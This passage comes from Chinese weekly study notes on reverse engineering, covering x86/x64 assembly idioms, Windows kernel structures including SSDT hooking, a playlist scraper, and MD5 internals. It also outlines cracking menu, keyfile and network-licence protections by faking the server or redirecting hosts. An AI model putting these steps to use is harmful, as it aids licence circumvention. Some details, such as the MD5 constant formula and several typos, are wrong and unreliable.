<p>除法指令需要用到符号扩展指令cdq，作用是把eax中的数视为有符号数，将eax的最高位（符号位）扩展到edx中。如果eax最高位是1，执行后edx=FFFFFFFF;如果是0，edx=00000000。通过这种方法把32位有符号数变为edx：eax的64位有符号数，满足64位运算指令的需要。</p>
<p>对除法优化时会用乘法代替除法，优化的公式较多，一例如：倒数相乘a<em>b=a </em>(1/b)</p>
<p>（在下面的64位中描述更完整）</p>
<h2 id="文本字符串"><a href="#文本字符串" class="headerlink" title="文本字符串"></a>文本字符串</h2><h3 id="字符寻址指令"><a href="#字符寻址指令" class="headerlink" title="字符寻址指令"></a>字符寻址指令</h3><p>与字符指针处理相关的指令有mov、lea等<br>mov指令将地址/寄存器中的数据放到目的寄存器中，如mov eax [401000]/[ecx]<br>lea（load effective address）操作数是地址,lea eax,[addr] 就是把addr的地址放入eax中<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lea eax,[401000]</span><br><span class="line">等价于</span><br><span class="line">mov eax,401000</span><br></pre></td></tr></table></figure></p>
<h3 id="计算字符串长度"><a href="#计算字符串长度" class="headerlink" title="计算字符串长度"></a>计算字符串长度</h3><p>c语言的strlen()：<br><img src="https://s1.ax1x.com/2020/03/25/8xCwqg.png" alt=" "></p>
<h1 id="64位软件逆向技术"><a href="#64位软件逆向技术" class="headerlink" title="64位软件逆向技术"></a>64位软件逆向技术</h1><p>x64通用寄存器的名称第一个字母由e改为r，共16个；16个128位xmm寄存器（通常用于优化代码）<br><img src="https://s1.ax1x.com/2020/03/25/8xCDaj.png" alt=" "></p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="栈平衡"><a href="#栈平衡" class="headerlink" title="栈平衡"></a>栈平衡</h3><p>每8字节的栈空间用来保存一个数据<br>尽量保证栈顶对齐值为16（可以被16整除）</p>
<h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>x86（32位）的函数调用有stdcall、__cdecl、fastcall等，x64只有一种寄存器快速调用约定：  </p>
<ol>
<li>整数：前四个参数用寄存器rcx→rdx→r8→r9，其余放在栈里，入栈顺序从右到左，任何大于8字节或不是1、2、4、8字节的参数用地址传递</li>
<li>浮点数：前四个参数用xmm寄存器完成：xmm0→xmm1→xmm2→xmm3  </li>
</ol>
<p><img src="https://s1.ax1x.com/2020/03/25/8xCBZQ.png" alt=" "></p>
<p>栈为函数的前四个参数预留了32字节的空间，当函数功能复杂时将寄存器的参数保存到这个预留栈空间。预览栈空间由函数调用者申请、平衡  </p>
<h2 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h2><h3 id="整数的除法-1"><a href="#整数的除法-1" class="headerlink" title="整数的除法"></a>整数的除法</h3><ol>
<li>有符号数，除数为2^n<br>x&gt;=0,x/2^n=x&gt;&gt;n<br>x<0,x/2^n=（x+（2^n-1））>&gt;n<br>除数为-2^n时最后用’neg 寄存器’指令求补  </li>
<li>有符号数，除数为正，非2^n<br>32位：x&gt;=0,result=(x<em>c&gt;&gt;32)+x&gt;&gt;n,<0时结果再+1  
64位：x>=0,result=(x</em>c&gt;&gt;64)+x&gt;&gt;n,&lt;0时结果再+1  </li>
<li>有符号数，除数为负，非2^n<br>32位：x&gt;=0,result=(x<em>c&gt;&gt;32)-x&gt;&gt;n,<0时结果再+1  
64位：x>=0,result=(x</em>c&gt;&gt;64)-x&gt;&gt;n,&lt;0时结果再+1  </li>
</ol>
<ul>
<li>c为魔数  </li>
</ul>
<ol>
<li>无符号数，除数位2^n<br>用shr右移</li>
<li>无符号数，除数非2^n<br>32位：x&gt;=0,result=x<em>c&gt;&gt;32&gt;&gt;n<br>62位：x&gt;=0,result=x</em>c&gt;&gt;62&gt;&gt;n</li>
</ol>
<h2 id="整数取模"><a href="#整数取模" class="headerlink" title="整数取模"></a>整数取模</h2><p>可以用除法指令，但是除法指令执行周期较长，通常优化将其转换成位运算或除法运算，再用除法运算进行优化  </p>
<ol>
<li>除数b=2^n<br>取得被除数二进制数的最后n位，负数要在n位之前补1：<br>x&gt;=0,result=x&amp;(b-1);x&lt;0,result=(x&amp;(b-1))-1|(~b-1)+1</li>
<li>除数b!=2^n<br>采用“余数=被除数-商<em>除数”<br>result=x-x/b</em>b</li>
</ol>
<h1 id="使用-OllyDbg-从零开始-Cracking"><a href="#使用-OllyDbg-从零开始-Cracking" class="headerlink" title="使用 OllyDbg 从零开始 Cracking"></a>使用 OllyDbg 从零开始 Cracking</h1><h2 id="数制系统"><a href="#数制系统" class="headerlink" title="数制系统"></a>数制系统</h2><p>十六进制负数  </p>
<p>从00000000~FFFFFFFF<br>正数：00000000~7FFFFFFF<br>负数：80000000~FFFFFFFF(-1)<br>在od左下角的commandbar可查询十六进制数的十进制值和对应的ASCII字符：<u>? [十六进制值]</u></p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p><img src="https://s1.ax1x.com/2020/04/02/GGxsMQ.png" alt=" "></p>
<ol>
<li><p>o，溢出标志<br>记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0  </p>
</li>
<li><p>p，奇偶标志<br>指令的结果用二进制表示时1的总数，如果为偶数PF=1，如果不为偶数PF=0</p>
</li>
<li>z，零标志<br>记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0  </li>
<li>s，符号标志<br>运算结果为负设置为1，结果为正设置为0  </li>
<li>c，进位标志<br>记录了无符号运算的结果是否有向更高位的进位（9位），有置1，无置0  </li>
<li>其他</li>
</ol>
<h1 id="python爬虫学习"><a href="#python爬虫学习" class="headerlink" title="python爬虫学习"></a>python爬虫学习</h1><p><a href="https://brubbish.github.io/710f8e5f.html##正则表达式">https://brubbish.github.io/710f8e5f.html##正则表达式</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.16-2020.03.22</title>
    <url>/dcd92ddb.html</url>
    <content><![CDATA[<h1 id="32位软件逆向技术"><a href="#32位软件逆向技术" class="headerlink" title="32位软件逆向技术"></a>32位软件逆向技术</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>计算机存储、组织数据的方式。确定数据结构后，算法就很容易得到，有时候也根据特定算法来判断数据结构</p>
<h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>局部变量分配空间时通常会使用栈和寄存器<br><a id="more"></a></p>
<h4 id="利用栈存放局部变量"><a href="#利用栈存放局部变量" class="headerlink" title="利用栈存放局部变量"></a>利用栈存放局部变量</h4><p>变量分配与清除的形式：</p>
<ol>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub esp,n</span><br><span class="line">...用[ebp-xxxx]寻址</span><br><span class="line">add esp,n</span><br></pre></td></tr></table></figure></li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add esp,-n</span><br><span class="line">...用[ebp+xxxx]寻址</span><br><span class="line">sub esp,-n</span><br></pre></td></tr></table></figure></li>
<li>(省空间)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push reg  ;(相当于sub esp，4)</span><br><span class="line">...用[ebp-xxxx]寻址</span><br><span class="line">pop reg</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>局部变量的起始值是随机的，是其他函数执行后留在栈中的垃圾数据，因此需要进行初始化，一种方法是通过mov指令，另一种是用push，如：”push 5”</p>
<h4 id="利用寄存器存放局部变量"><a href="#利用寄存器存放局部变量" class="headerlink" title="利用寄存器存放局部变量"></a>利用寄存器存放局部变量</h4><p>除了栈占用2个寄存器，编译器会利用其他6个通用寄存器尽可能的存放局部变量，如果寄存器不够用会存到栈中</p>
<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>全集变量通常位于.data区块的一个固定地址处，访问时一般会用一个固定的硬编码地址直接对内存进行寻址（←使用这种方式比较容易识别出这是一个全局变量。）<br>一般编译器会将<em>全局变量</em>放到<em>可读</em>写的区块里，如果放到<em>只读</em>区块里就是一个<em>常量</em>  </p>
<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>访问一般时通过基址加变址寻址实现的（基址可以是常量也可以是寄存器）  </p>
<h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><p>虚函数是在程序运行时定义的函数。（c++）<br>虚函数的地址不能在编译时确定，只能在调用即将进行时确定。所有对虚函数的引用通常放在一个专用数组-虚函数表（virtual table）中，数组中的元素存放的就是类中数表的地址。</p>
<blockquote>
<p>虚函数 是在基类中使用关键字 virtual 声明的函数。在派生类中重新定义基类中定义的虚函数时，<em>会告诉编译器不要静态链接到该函数</em>。<br>基类：当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类，新建的类称为派生类。<br>继承：代表了 is a 关系。例如，哺乳动物是动物，狗是哺乳动物，因此，狗是动物，等等。(runoob.com)</p>
</blockquote>
<p>程序通过两次寻址得到虚函数的地址然后执行</p>
<h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><p>通常为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmp a,b</span><br><span class="line">jz&#x2F;jnz(相当于je&#x2F;jne) xxxx</span><br></pre></td></tr></table></figure><br>整数用cmp指令比较，浮点值用fcom、fcomp等指令比较<br>许多情况下，编译器用test或or之类的较短的逻辑指令来替换cmp指令<br><img src="https://s1.ax1x.com/2020/03/19/8ssrPP.md.png" alt=" "></p>
<h3 id="switch-case"><a href="#switch-case" class="headerlink" title="switch-case"></a>switch-case</h3><p>编译器会编译出一组由不同关系运算组成的语句</p>
<p>如果编译时设置优化选项为“Maximize Speed”，编译器会用”dec eax”代替cmp指令。如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push ecx</span><br><span class="line">lea eax,[esp]</span><br><span class="line">push eax</span><br><span class="line">push 0040804c</span><br><span class="line">call 004010A1   ;scanf</span><br><span class="line">mov eax,[esp+8] ;将输入的值传给eax</span><br><span class="line">add esp,00000008</span><br><span class="line"></span><br><span class="line">dec dax         ;检查eax是否为1h</span><br><span class="line">je 00401055</span><br><span class="line">                ;zf记录相关指令执行后结果是否为0，如果为0那么ZF&#x3D;1，如果不为0那么ZF&#x3D;0</span><br><span class="line">                ;je:等于则转移(检测zf&#x3D;1) </span><br><span class="line"></span><br><span class="line">(同理也可使用sub eax,xxxxxx判断是否为其他值)</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
<h3 id="转移指令机器码的计算"><a href="#转移指令机器码的计算" class="headerlink" title="转移指令机器码的计算"></a>转移指令机器码的计算</h3><p>短转移：无条件和有条件的<em>机器码均为2字节</em>，范围为-128~127（2^8）<br>长转移：无条件的机器码为<u>5字节</u>，条件转移为<u>6字节</u>。因为无条件用一个字节（jmp）表示转移类型；条件转移用2个字节（如je、jns），用其他四个字节表示偏移量<br>子程序调用指令：调用的参数不涉及寄存器、栈等值的类似于长转移；涉及的例如“call dword ptr [eax+2]”  比较复杂，不表（….）<br>条件转移指令的范围是16位遗留下的。<br>cpu开发人员只给目的地址分配了1字节（8位），将跳转的长度限制在225字节之内  </p>
<p>无条件短转移的机器码形式为:”EBxx”。B00H~EB4F是向后转移，EB80~EBFFH是向前转移  </p>
<p>转移指令的机器码形式为：<br>位移量=目的地址-起始地址-跳转指令本身长度<br>转移指令机器码=转移类别机器码(如前文中的EB）+位移量</p>
<blockquote>
<p><a href="https://brubbish.github.io/34199.html#%E6%A0%B9%E6%8D%AE%E4%BD%8D%E7%A7%BB%E8%BF%9B%E8%A1%8C%E8%BD%AC%E7%A7%BB%E7%9A%84%E6%84%8F%E4%B9%89">https://brubbish.github.io/34199.html#%E6%A0%B9%E6%8D%AE%E4%BD%8D%E7%A7%BB%E8%BF%9B%E8%A1%8C%E8%BD%AC%E7%A7%BB%E7%9A%84%E6%84%8F%E4%B9%89</a>  </p>
</blockquote>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFC6O.png" alt="jmp 401005对应机器码EB03"> </p>
<h1 id="python爬虫学习"><a href="#python爬虫学习" class="headerlink" title="python爬虫学习"></a>python爬虫学习</h1><p>记录的有点乱，还没整理好<br>学习的原因是 看了某个论坛上一个学了几周爬虫 后用其爬的结果回答的答主 遂感牛逼，再加上有时候想学点别的作为调节（🤦‍）<br><a href="https://brubbish.github.io/710f8e5f.html">https://brubbish.github.io/710f8e5f.html</a> </p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.20-2020.04.26</title>
    <url>/45941.html</url>
    <content><![CDATA[<h1 id="Windows内核基础"><a href="#Windows内核基础" class="headerlink" title="Windows内核基础"></a>Windows内核基础</h1><h2 id="内核理论基础"><a href="#内核理论基础" class="headerlink" title="内核理论基础"></a>内核理论基础</h2><h3 id="Windows-r0和r3通信"><a href="#Windows-r0和r3通信" class="headerlink" title="Windows r0和r3通信"></a>Windows r0和r3通信</h3><p>当一个应用程序调用一个有关io的api，事实上这个api被封装在应用层的某个dll库文件中，dll动态库中函数调用的更底层的函数包含在ntdll.dll文件中。<br>当应用层的某个api通过ntdll.dll里的native api执行时，会完成参数检查工作，再用一个中断指令从r3层进入r0层。<br><a id="more"></a><br>ntdll.dll中的函数时成对出现的，分别以“nt”和“zw”开头，如ntcreatefile、zwcreatefile<br>从用户模式调用nt<em> 和zw</em> api,连接ntdll.lib：<br>&emsp;&emsp;二者都是通过设置系统服务表中的索引和在栈中设置参数，通过sysenter或syscall指令进入内核态，并最终跳转到kiservicetable对应的系统服务例程中。代码会严格检查从用户空间传入的参数<br>从内核模式调用nt<em> 和zw</em> api,连接ntdll.lib：<br>&emsp;&emsp;nt<em> api将直接调用对应函数，zw</em> api通过kisystemservice跳转到对应的函数代码<br>调用nt<em> api时不会改变previous mode（分为用户态和内核态）的状态；调用zw</em> api时会将previous mode 改为内核态。使用zw* api可以避免额外的参数列表检查，提高效率  </p>
<p>内核主要由各种驱动（在磁盘上时.sys文件）组成，有的是系统自带的，有的是软件厂商提供的。驱动加载后会生成对应的设备对象，并可以选择向r3提供一个可供访问和打开的符号链接<br>应用层程序可以根据符号链接调用CreateFile()函数打开，在获得句柄后，程序就可以调用应用层函数与内核驱动进行通信<br>&emsp;&emsp;符号链接（软链接）：a symbolic link is a file that links to another file or directory using its path.然后大概是路径可以自动变的快捷方式…吧<br>内核驱动执行DriverEntry()函数后就可以接受r3层的通信请求了。内核驱动中专门有一组函数用于响应应用层的调用请求   </p>
<h3 id="内核函数"><a href="#内核函数" class="headerlink" title="内核函数"></a>内核函数</h3><p>前缀：<br><img src="https://s1.ax1x.com/2020/04/24/JDmOoR.png" alt=" "></p>
<p>调用内核函数要注意它的中断请求级别（IRQL,Interrupt Request Level）要求。内核在不同情况下会运行在不同的IRQL级别上，此时必须调用符合该级别的内核函数</p>
<p><img src="https://s1.ax1x.com/2020/04/24/JD0lBd.png" alt=" "></p>
<p>passive_level：最低级别，对所有中断都可以做出响应，<strong>用户模式代码都运行在该中断级别上</strong>，可以访问分页内存<br>apc_level：只有apc级别的中断可以被屏蔽，可以访问分页内存，分页调度管理就运行在该级别上<br>dispatch_level:该级别和更低的中断被屏蔽，不能访问分页内存，只能处理不可分页的内存，因此在这个级别上能访问的api大大减少。线程调度运行在该级别上。线程调度用于执行多任务，由时钟中断来保证，因此该级别的中断即是调度中断。这个级别对一些严重中断不进行处理，所以要慎重使用（emmm….)<br>DIRQL（Device IRQL）：IRQL的最高级别，在该级别上的中断都会被忽略，通常用于判断设备优先级</p>
<ul>
<li>分页内存：<br>在保护模式中，内存访问使用分段机制，即”段基址:段内偏移地址”；操作系统将一些进程不常用的内存放到硬盘中，腾出内存空间，在一定程度上解决了内存不足的问题，但如果内存特别小，就会无法容纳任何一个进程的段。这个问题的原因是在只有分段的情况下，cpu认为线性地址等于物理地址，所以物理地址也必须要连续，但实际上可用的物理地址不连续。为了解决这个问题，需要让物理地址和线性地址重新建立映射，让前者不连续，后者连续，由此引出内存分页机制<br>分页机制建立在分段机制的基础上，因此分页在分段后进行。在内存分页机制下，由“段基址:段内偏移地址”得到的线性地址不是物理地址而是虚拟地址，对应的物理地址要在页表中查找。<br>分页机制提供连续线性地址到不连续物理地址的映射，以及用大小相等的页代替大小不相等的段</li>
</ul>
<h3 id="内核驱动模块"><a href="#内核驱动模块" class="headerlink" title="内核驱动模块"></a>内核驱动模块</h3><p>内核驱动扩展名为.sys   </p>
<ul>
<li>驱动的加载和执行<br>创建一个服务（注册表），在services键下（….\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\）建立一个与驱动名称相关的服务键，服务键规定了驱动的一些属性，如加载的先后等<br>对象管理器生成驱动对象，并传递给DriverEntry()函数，执行DriverEntry()函数。（DriverEntry()是驱动执行的入口函数）<br>创建控制设备对象；创建控制设备符号链接；如果是过滤驱动，则创建过滤设备对象并绑定<br>注册特定的分发派遣函数<br>其他初始化动作，如hook、过滤（如文件过滤、防火墙过滤）等的注册和 初始化   </li>
</ul>
<p>&emsp;*过滤驱动就是挂载在其他驱动上，对某设备的irp(I/O Request Package)进行拦截过滤作用，可以对设备进行功能扩展，或是数据加密等的驱动程序。</p>
<h2 id="内核的数据结构"><a href="#内核的数据结构" class="headerlink" title="内核的数据结构"></a>内核的数据结构</h2><h3 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h3><p>内核对象是一种Windows内核中的数据结构管理机制。应用层的进程、线程、文件、等对象或打开的句柄在内核中都有对应的内核对象<br>一个内核对象可以分为对象头和对象体。对象头中至少有一个OBJECT_HEADER和对象额外信息。对象体紧接着对象头中的OBJECT_HEADER。一个指针总是指向对象体而不是对象头，将对象体指针减去偏移值，获得OBJECT_HEADER的结构，从而访问其他对象结构辅助信息<br><img src="https://s1.ax1x.com/2020/04/26/JcAJKO.png" alt=" "><br>内核对象分为：  </p>
<ol>
<li>Dispatcher对象<br>在对象体开始位置放置了一个共享的公共数据结构DISPATCHER_HEADER，包含了这个结构的内核对象名字都以K开头（但K开头的不一定都是这个对象），这些内核对象都是可以等待的（(waitable):①当到达某一个时间后，才继续线程的执行。/②当到达某一个时间后，调用某一个函数，而且间隔多少时间后，再次调用。）   </li>
<li>io对象<br>在开始位置不放置DISPATCHER_HEADER，但通常放置一个与type和size有关的整型成员。   </li>
<li>其他对象<br>包括进程对象(EPROCESS)和线程对象(ETHREAD)等<br>EPROCESS用于管理进程的各种信息，每一个进程都对应一个EPROCESS结构，用于记录进程执行期间的各种数据。<br>第一个成员是进程的对象KPROCESS，所有进程的EPROCESS内核结构都被放入一个双向链表，R3在枚举系统进程的时候，通过遍历这个链表获得了进程的列表   </li>
</ol>
<p>ETHREAD结构是线程的内核管理对象，每一个线程都有一个对应的ETHREAD结构。结构的第一个成员是线程对象KTHREAD，所有的ETHREAD结构也被放在一个双向链表里<br><img src="https://s1.ax1x.com/2020/04/26/JcAYrD.png" alt=" ">   </p>
<h3 id="SSDT"><a href="#SSDT" class="headerlink" title="SSDT"></a>SSDT</h3><p>“system services descriptor table”, 在内核中的实际名称是”KeServiceDscriptorTable”<br>用于处理应用层通过Kernel32.dll下发的各个api操作请求。当kernel32.dll的api通过ntdll.dll时，会先完成对参数的检查，在调用一个中断，从而实现r3层进入r0层。</p>
<p>SSDT表中最重要的两个成员为ServiceTableBase（表的基地址）和NumberOfServices（系统中SSDT服务函数的个数）<br>由ssdt表的基地址和ssdt函数的索引号可以求出对应的服务函数的地址（32位和64位计算公式不同）   </p>
<h4 id="Shadow-SSDT"><a href="#Shadow-SSDT" class="headerlink" title="Shadow SSDT"></a>Shadow SSDT</h4><p>原理和SSDT类似，对应的表名为KeServiceDscriptorTable<strong>Shadow</strong>，是内核未导出（不能在自己的模块中导入和直接引用）的一张表，包含Ntoskrnel.exe和win32.sys服务函数。<br>hook该表中的某些函数可以实现截屏保护、模拟按键、防止窗口被关闭等   </p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>一个爬取自己网易云歌单的爬虫</title>
    <url>/53778.html</url>
    <content><![CDATA[<p>现在只弄了红心歌单<br>可以得出每个歌手的出现次数（不包括多人唱一首的情况）<br>还没有排序<br>也不能输出到文件<br>参考：<a href="https://blog.csdn.net/fu254983303/article/details/79434882" target="_blank" rel="noopener">https://blog.csdn.net/fu254983303/article/details/79434882</a><br><a id="more"></a><br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">kv=&#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0'</span>&#125;</span><br><span class="line">r=requests.get(<span class="string">'https://music.163.com/playlist?id=xxxxxxxxx'</span>,headers=kv,timeout=<span class="number">30</span>)</span><br><span class="line">html=r.text</span><br><span class="line">reg_list = <span class="string">'&lt;ul class="f-hide"&gt;&lt;li&gt;(.*?)&lt;/ul&gt;'</span></span><br><span class="line">reg_list = re.compile(reg_list, re.S)</span><br><span class="line">content = re.findall(reg_list, html)</span><br><span class="line">reg = <span class="string">'&lt;a href="(.*?)"&gt;(.*?)&lt;/a&gt;&lt;/li&gt;'</span>  </span><br><span class="line">reg = re.compile(reg, re.S)</span><br><span class="line">song_list = re.findall(reg, content[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">singer=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    singer.append([<span class="number">0</span>]*<span class="number">2</span>)</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> song_list:</span><br><span class="line">    url=<span class="string">"https://music.163.com"</span>+song_list[i][<span class="number">0</span>]</span><br><span class="line">    r=requests.get(url,headers=kv,timeout=<span class="number">30</span>)</span><br><span class="line">    htm=r.text</span><br><span class="line">    reg_list2=<span class="string">'&lt;p class="des s-fc4"&gt;歌手：&lt;span title="(.*?)"&gt;'</span></span><br><span class="line">    reg_list2=re.compile(reg_list2,re.S)</span><br><span class="line">    s=re.findall(reg_list2,htm)</span><br><span class="line"></span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j&lt;k:</span><br><span class="line">        <span class="keyword">if</span> s!=singer[j][<span class="number">0</span>]:</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            singer[j][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j==k:</span><br><span class="line">        <span class="keyword">if</span> s!=singer[j][<span class="number">0</span>]:</span><br><span class="line">            k+=<span class="number">1</span></span><br><span class="line">            singer[k][<span class="number">0</span>]=s</span><br><span class="line">            singer[k][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            singer[j][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(singer)</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.06-2020.04.12</title>
    <url>/51835.html</url>
    <content><![CDATA[<h1 id="菜单功能限制"><a href="#菜单功能限制" class="headerlink" title="菜单功能限制"></a>菜单功能限制</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>要将软件菜单和窗口变得不可用，可用以下函数   </p>
<ol>
<li>EnableMenultem()<br>允许或进制指定的菜单条目<br>参数：菜单句柄、目标菜单条目的标识符、控制标志（允许、灰化、禁止等）<br>返回值：返回菜单以前的状态  </li>
<li>EnableWindow()<br>允许或禁止指定窗口<br>参数：窗口句柄、true/false<br>返回值：0表示失败，非0表示成功  <a id="more"></a>
<h2 id="拆解菜单限制保护"><a href="#拆解菜单限制保护" class="headerlink" title="拆解菜单限制保护"></a>拆解菜单限制保护</h2>修改控制标志或true/false  <h1 id="KeyFile保护"><a href="#KeyFile保护" class="headerlink" title="KeyFile保护"></a>KeyFile保护</h1>付费后将作者提供的注册文件keyfile放到指定目录下可用让软件成为正版<br>软件每次启动时都会读取该文件，然后利用某种算法进行处理，以此判断结果是否正确  <h2 id="相关api函数"><a href="#相关api函数" class="headerlink" title="相关api函数"></a>相关api函数</h2>|api函数|作用|<br>-|-<br>FindFirstA|确定文件是否存在<br>CreateFileA、_lopen|确定文件是否存在；打开文件获得其句柄<br>GetFileSizeA、GetFileEx|获得文件的大小<br>GetFileSize、GetFileAttributesExA|获得文件的属性<br>SetFilePointer、GetFilePointerEx|移动文件指针<br>ReadFile|读取文件内容  </li>
</ol>
<h1 id="网络验证"><a href="#网络验证" class="headerlink" title="网络验证"></a>网络验证</h1><p>思路是拦截服务器返回的数据包，分析程序是如何处理数据包的   </p>
<h2 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h2><p>常用的有send()、recv()【这两个是socket（套接字，计算机之间进行通信的一种约定或一种方式）函数】、WSASend()、WSARecv()等   </p>
<h2 id="破解网络验证的一般思路"><a href="#破解网络验证的一般思路" class="headerlink" title="破解网络验证的一般思路"></a>破解网络验证的一般思路</h2><p>如果验证的数据包内容固定，可以抓取数据包，写一个本地服务端模拟服务器<br>如果不固定则需要找出相应的算法   </p>
<ol>
<li>分析发送的数据包<br>在od中对send()之类的函数设断，分析加密的位置和方式  </li>
<li>分析接收的数据包<br>客户端程序使用recv()之类的函数接收数据，然后进行解密。对解密后数据存放的地址下内存读断点  </li>
<li>解除网络验证<br>编写一个服务端，模拟服务器来接收和发送数据<br>如果软件用域名登陆服务器，可以修改hosts，使域名指向本地<br>如果软件用ip地址连接服务器，可以用inet_addr或connect等设断，将ip地址修改为本地ip地址，或用代理软件将ip地址指向本地  </li>
</ol>
<p>网络验证的关键是数据包分析  </p>
<h1 id="常用断点设置"><a href="#常用断点设置" class="headerlink" title="常用断点设置"></a>常用断点设置</h1><p><img src="https://s1.ax1x.com/2020/04/09/GInJdU.png" alt=" "> </p>
<h1 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h1><h2 id="单向散列算法"><a href="#单向散列算法" class="headerlink" title="单向散列算法"></a>单向散列算法</h2><p>即hash算法，是将任意长度的消息压缩到某一固定长度的函数（不可逆）<br>因为是不可逆算法，只能使用hash函数作为加密的一个中间步骤。如，对用户名进行hash变换，再用这个结果进行可逆的加密变换，生成注册码  </p>
<h3 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h3><p>MD5消息摘要算法<br>对任意长度的消息进行运算，产生128位的消息摘要  </p>
<h4 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h4><ol>
<li>数据填充<br>填充消息，使消息长度（bit）对512求余的结果等于448【比512的倍数小64位】（本身满足了也要）。方法是：附一个1在后面，然后用0来填充。  </li>
<li>添加长度<br>在结尾用64位记录原文长度，最终消息长度是512的整数倍  </li>
<li>初始化变量<br>MD5的结果按32位一组分成4组，由4个寄存器（A、B、C、D）进行演变得到<br>寄存器初始值为：  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原本应为：</span><br><span class="line">A&#x3D;0x01234567</span><br><span class="line">B&#x3D;0x89ABCDEF</span><br><span class="line">C&#x3D;0xFEDCBA98</span><br><span class="line">D&#x3D;0x76543210</span><br><span class="line">为了在内存中也长那样↑，所以要调整成：</span><br><span class="line">A &#x3D; 0x67452301;</span><br><span class="line">B &#x3D; 0xEFCDAB89;</span><br><span class="line">C &#x3D; 0x98BADCFE;</span><br><span class="line">D &#x3D; 0x10325476;</span><br></pre></td></tr></table></figure></li>
<li>数据处理<br>4个辅助函数：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F(X, Y, Z) &#x3D;(X&amp;Y) | ((~X) &amp; Z)</span><br><span class="line">G(X, Y, Z) &#x3D;(X&amp;Z) | (Y &amp; (~Z))</span><br><span class="line">H(X, Y, Z) &#x3D;X^Y^Z</span><br><span class="line">I(X, Y, Z)&#x3D;Y^(X|(~Z))</span><br></pre></td></tr></table></figure>
<img src="https://s1.ax1x.com/2020/04/09/GInbFg.png" alt="流程"><br>将ABCD的副本abcd中的3个经过运算后与第四个相加，再加上两个常数，并将所得的值<strong>循环左移</strong>s位，最后将所得结果加上abcd之一，回送至ABCD（一次子循环）  </li>
</ol>
<ul>
<li>执行的函数和次数：<br>先执行16次F,再执行16次G….共64次（每次主循环）<br>主循环次数：原文长度/512（全部消息）</li>
<li>相加的两个常数：<br>一个是<strong>利用第2步的原文</strong>，将其等分成16份（每份长度为32位），循环使用其中一份。<br>另一个是4^32*abs(sin(i))得到的整数部分,在第i步中，i用弧度表示。目的是用正弦函数和幂函数消除变换中的线性  </li>
<li>循环左移位数s：有个表<br><img src="https://s1.ax1x.com/2020/04/12/GLmJmj.png" alt=" "></li>
</ul>
<ol>
<li>输出</li>
</ol>
